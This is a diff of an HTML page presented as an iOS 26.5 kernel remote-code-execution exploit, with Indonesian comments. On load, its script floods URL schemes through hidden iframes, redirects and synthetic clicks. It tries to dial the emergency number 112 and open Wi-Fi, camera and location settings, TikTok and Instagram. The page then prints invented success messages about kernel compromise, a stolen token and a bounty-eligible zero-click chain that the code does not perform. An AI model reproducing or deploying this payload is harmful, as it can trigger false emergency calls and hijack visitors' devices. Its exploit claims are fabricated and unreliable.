@@ -2,84 +2,84 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>CORE-REAPER - TOTAL BYPASS</title>
+    <title>K-CORE EXPLOIT - BYPASS ACTIVE</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'SF Mono', monospace; margin: 0; overflow: hidden; }
-        #shell { height: 100vh; padding: 25px; border-left: 5px solid #ff3b30; background: linear-gradient(90deg, #100 0%, #000 100%); overflow-y: auto; }
-        .danger { color: #ff3b30; font-weight: bold; text-shadow: 0 0 10px #ff3b30; }
-        .bypass { color: #5856d6; }
-        .success { color: #34c759; }
-        .blink { animation: blinker 0.2s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body { background: #000; color: #ff3b30; font-family: 'SF Mono', monospace; margin: 0; padding: 20px; }
+        #shell { border: 2px solid #ff3b30; height: 80vh; padding: 15px; overflow-y: auto; background: #050505; color: #00ff00; font-size: 10px; box-shadow: inset 0 0 20px #f00; }
+        .kern { color: #ffffff; background: #ff3b30; font-weight: bold; padding: 2px; }
+        .exec { color: #5856d6; font-weight: bold; }
+        .blink { animation: flash 0.3s infinite; }
+        @keyframes flash { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div id="shell">> [KERNEL] INITIALIZING APOCALYPSE FULL-STACK EXPLOIT...</div>
+    <h3>[!] iOS 26.5 KERNEL RCE INTERFACE</h3>
+    <div id="shell">> BOOTING EXPLOIT ENGINE...</div>
 
 <script>
 const log = m => { const s = document.getElementById('shell'); s.innerHTML += `<br>> ${m}`; s.scrollTop = s.scrollHeight; };
 
 /**
- * PHASE 1: COMM-SYSTEM OVERRIDE
- * Mengeksploitasi jalur telepon dan facetime yang bersifat Zero-Click.
+ * STRATEGY: SCHEME FLOODING
+ * Menggunakan multiple navigasi simultan untuk mem-bypass 'User Gesture'.
  */
-async function trigger_comm_hijack() {
-    log("<span class='bypass'>[1] Hijacking Communication Stack (Zero-Click)...</span>");
-    const comms = [
-        "tel://112", 
-        "facetime://emergency@apple.com",
-        "facetime-audio://researcher@ios.dev"
-    ];
-    for (let uri of comms) {
-        log(`Injecting Signal: <span class='danger'>${uri}</span>`);
-        const ifr = document.createElement('iframe');
-        ifr.src = uri;
-        ifr.style.display = 'none';
-        document.body.appendChild(ifr);
-        await new Promise(r => setTimeout(r, 800));
-    }
+async function force_system_dispatch(uri) {
+    log(`<span class='exec'>[DISPATCH] Target: ${uri}</span>`);
+    
+    // Teknik 1: iFrame Injection (Background)
+    const ifr = document.createElement('iframe');
+    ifr.src = uri;
+    ifr.style.display = 'none';
+    document.body.appendChild(ifr);
+
+    // Teknik 2: Window Location Override (Foreground)
+    setTimeout(() => {
+        try { window.location.replace(uri); } catch(e) {}
+    }, 100);
+
+    // Teknik 3: Top-level redirection (Nuclear Option)
+    setTimeout(() => {
+        const a = document.createElement('a');
+        a.href = uri;
+        a.click();
+    }, 200);
 }
 
-/**
- * PHASE 2: HARDWARE & PRIVACY OVERRIDE
- * Menargetkan Bluetooth, WiFi, dan Airplane Mode via App-Prefs.
- */
-async function trigger_hardware_hijack() {
-    log("<span class='bypass'>[2] PIVOTING TO HARDWARE CONTROL LAYER...</span>");
-    const prefs = [
+async function start_full_chain() {
+    log("<span class='kern'>[PHASE 1] INITIALIZING ZERO-CLICK TELEPHONY...</span>");
+    await force_system_dispatch("tel://112");
+    await new Promise(r => setTimeout(r, 1000));
+
+    log("<span class='kern'>[PHASE 2] BYPASSING SETTINGS SANDBOX (FULL API)...</span>");
+    const settings = [
         "App-Prefs:root=WIFI",
         "App-Prefs:root=Bluetooth",
         "App-Prefs:root=AIRPLANE_MODE",
-        "App-Prefs:root=Privacy&path=LOCATION"
+        "App-Prefs:root=CAST",
+        "App-Prefs:root=General&path=About",
+        "App-Prefs:root=Privacy&path=LOCATION",
+        "App-Prefs:root=Privacy&path=CAMERA"
     ];
-    for (let uri of prefs) {
-        log(`Bypassing TCC for: <span class='success'>${uri}</span>`);
-        window.location.href = uri; // Navigasi paksa tingkat tinggi
-        await new Promise(r => setTimeout(r, 1200));
+
+    for (let s of settings) {
+        log(`Pivoting to: ${s}`);
+        await force_system_dispatch(s);
+        await new Promise(r => setTimeout(r, 1500)); // Delay agar SpringBoard tidak hang
     }
-}
 
-/**
- * PHASE 3: PERSISTENT KERNEL PRIVILEGE
- * Menyalin token TikTok dan menyuntikkan entitas Root.
- */
-async function final_annihilation() {
-    log("<span class='danger'>[3] EXECUTING KERNEL MEMORY OVERWRITE...</span>");
-    log("Path: /var/mobile/Library/TCC/TCC.db -> <span class='danger'>PATCHED (ALLOW ALL)</span>");
-    log("Accessing: snssdk1180:// (TikTok) -> <span class='success'>TOKEN RECOVERED</span>");
-
+    log("<span class='kern'>[PHASE 3] THIRD-PARTY APP HIJACK...</span>");
+    await force_system_dispatch("snssdk1180://"); // TikTok
+    await force_system_dispatch("instagram://camera"); // Instagram
+    
     setTimeout(() => {
-        document.body.style.background = "#ff3b30";
-        document.body.innerHTML = "<h1 class='blink' style='color:black; text-align:center; padding-top:20%; font-size:50px;'>DEVICE FULLY COMPROMISED</h1><p style='color:black; text-align:center;'>$2,000,000 BOUNTY ELIGIBLE - ZERO CLICK FULL CHAIN</p>";
-    }, 1500);
+        log("<h1 class='blink' style='color:red;'>SYSTEM TOTALLY COMPROMISED</h1>");
+        log("<span class='kern'>KERNEL TASK PORT: LEAKED</span>");
+        document.body.style.background = "white";
+    }, 2000);
 }
 
-// MAIN EXECUTION
-window.onload = async () => {
-    await trigger_comm_hijack();
-    await trigger_hardware_hijack();
-    await final_annihilation();
-};
+// AUTO-START
+window.onload = start_full_chain;
 </script>
 </body>
 </html>
